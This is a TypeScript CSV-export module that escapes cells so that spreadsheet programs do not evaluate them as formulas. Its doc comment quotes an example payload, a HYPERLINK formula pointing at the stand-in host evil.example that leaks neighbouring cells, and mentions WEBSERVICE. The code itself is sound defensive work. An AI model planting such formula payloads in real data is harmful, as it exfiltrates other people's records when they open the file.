/** Minimal, dependency-free CSV export. Triggers a browser download. */

// Excel, Sheets and LibreOffice evaluate any cell whose text begins with one of
// these — the value stops being data and becomes code the moment it leads with
// one. A leading tab or CR counts too: the parser strips it before deciding, so
// "\t=cmd" still lands as a formula.
const FORMULA_LEAD = /^[=+\-@\t\r]/;
// ...but a genuine number keeps its own leading sign, so a negative amount still
// imports as a number rather than as the text "'-1234.5".
const NUMERIC_LITERAL = /^-?\d+(?:\.\d+)?$/;

/**
 * One CSV cell: formula-guarded, then RFC-4180 quoted.
 *
 * The guard is not theoretical here. Several exported columns carry text an
 * UNAUTHENTICATED submitter chose — POST /api/portal/:orgSlug/leads writes the
 * submitted companyName and contactName straight onto a new buyer, and those are
 * the first three columns of the Buyers export. So a lead filed under
 * `=HYPERLINK("https://evil.example/?d="&A2&B2,"Open deal")` sits in the CRM
 * until a colleague exports and opens the file, at which point the cell is a
 * live link that leaks the row beside it. `=WEBSERVICE(...)` needs no click.
 *
 * The fix is the spreadsheet's own escape hatch: a leading apostrophe means
 * "treat the rest as literal text". It is consumed on import — the cell displays
 * the original string — and it survives the quoting below because it is added
 * first, landing inside the quotes rather than beside them.
 */
export function escapeCell(v: unknown): string {
  if (v == null) return "";
  let s = String(v);
  if (typeof v !== "number" && FORMULA_LEAD.test(s) && !NUMERIC_LITERAL.test(s)) s = `'${s}`;
  // \r joins the quote set because a lone CR splits a row in some parsers.
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export function downloadCsv(filename: string, headers: string[], rows: (string | number | null | undefined)[][]): void {
  const lines = [headers.map(escapeCell).join(","), ...rows.map((r) => r.map(escapeCell).join(","))];
  const blob = new Blob([lines.join("\n")], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}
